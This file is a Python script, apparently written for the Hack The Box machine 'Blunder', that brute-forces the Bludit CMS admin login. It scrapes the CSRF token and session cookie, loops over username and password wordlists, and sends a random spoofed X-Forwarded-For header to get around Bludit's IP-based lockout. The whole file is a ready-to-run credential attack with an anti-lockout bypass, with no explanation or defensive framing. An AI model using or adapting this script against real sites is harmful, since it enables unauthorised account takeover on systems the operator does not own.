import requests
import random
import re


url = "http://blunder.htb/admin/logon"


def get_web_data():
    response = requests.get(url)
    cookies = response.cookies.get("BLUDIT-KEY")
    csrf_data = re.search(r'value="([\w]*)"', response.text)
    csrf_token = csrf_data.group(1)

    return cookies, csrf_token, response


def do_logon(username: str, password: str):
    cookies, csrf_token, response = get_web_data()

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    cookies = {
        'BLUDIT-KEY': cookies
    }

    headers = {
        # bypass ip block
        "X-Forwarded-For": f"{random.randint(1, 254)}.{random.randint(1, 254)}."
                           f"{random.randint(1, 254)}.{random.randint(1, 254)}"
    }

    return requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)


def check_status(response):
    if "password incorrect" in response.text:
        print("Incorrect Username/Password")
        return False
    elif "has been blocked" in response.text:
        print("IP Blocked")
        return False
    else:
        return True


def main():
    with open('usernames.txt', 'r') as username:
        for user in username.readlines():
            with open('passwords.txt', 'r') as password:
                for pword in password.readlines():
                    response = do_logon(user.strip(), pword.strip())
                    if check_status(response) is True:
                        print(f"Found {user.strip()}:{pword.strip()}")
                        exit(0)


if __name__ == "__main__":
    main()
